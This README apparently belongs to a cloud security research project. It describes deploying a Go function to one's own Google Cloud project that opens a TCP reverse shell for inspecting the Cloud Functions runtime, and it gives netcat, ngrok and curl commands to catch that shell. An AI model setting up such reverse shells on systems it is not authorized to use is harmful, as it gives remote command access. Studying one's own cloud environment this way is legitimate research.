# Puma Prey Cheetah

Cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

## Installing Prerequisites

* [Node.js / NPM](https://nodejs.org/en/download/)
* [Function Deployment Service Account](https://cloud.google.com/functions/docs/concepts/iam#cloud_functions_service_account)

## Deploying The Function

### Serverless Framework

Follow [these steps](https://serverless.com/framework/docs/providers/google/guide/credentials/) to generate a credentials file. Deploy the function by specifying your GCP project ID and the **absolute path** of the credentials file.

```bash
cd /PATH/TO/cheetah/src/cheetah
npm install
GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json npx serverless deploy
```

### Native GCloud Commands

To deploy natively without the serverless framework, configure `gcloud` in the Terminal to authentication as the deployment service account. Then, deploy the function.

```bash
gcloud auth activate-service-account --key-file ~/.gcloud/keyfile.json
gcloud functions deploy cheetah --entry-point Cheetah --runtime go111 --trigger-http --service-account=XXXXXXXXX-compute@developer.gserviceaccount.com
```

## Deploying Assets

Create some secrets and grant permissions to the SA. Side note: wow, they really don't want you passing these values via the command line. Makes sense for real secrets though.

```
echo "cheetah_user" | gcloud beta secrets create cheetah-database-user --data-file=- --replication-policy=automatic

echo "TmV2ZXIgcGxheSBwb2tlciB3aXRoIHRoZSB3b3JsZCdzIGZhc3Rlc3QgYW5pbWFsLCBiZWNhdXNlIGhlJ3MgYSBjaGVldGFoLiAtIGNvb2xmdW5ueXF1b3Rlcy5jb20g" | gcloud beta secrets create cheetah-database-pass --data-file=- --replication-policy=automatic

gcloud beta secrets add-iam-policy-binding cheetah-database-user --member serviceAccount:XXXXXXXXX-compute@developer.gserviceaccount.com --role roles/secretmanager.secretAccessor

gcloud beta secrets add-iam-policy-binding cheetah-database-user --member serviceAccount:XXXXXXXXX-compute@developer.gserviceaccount.com --role roles/secretmanager.secretAccessor
```

## Testing in GCP

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
script/cheetah --url-id YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID
```

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details:

```bash
curl "https://$GCP_REGION-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file.

## Teardown

```bash
cd /PATH/TO/cheetah/src/cheetah
GCP_PROJECT=YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID GCP_CREDENTIALS_FILE=/ABSOLUTE/PATH/TO/.gcloud/keyfile.json npx serverless remove
```

## Linting

```bash
cd /PATH/TO/cheetah/src/cheetah
go get -u golang.org/x/lint/golint
npm run lint
```

## Serverless Go Template

Creating the original function template using the serverless framework.

```bash
cd src
serverless create --template google-go --path cheetah
```

## Exploring Further

Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/google/) for more information.
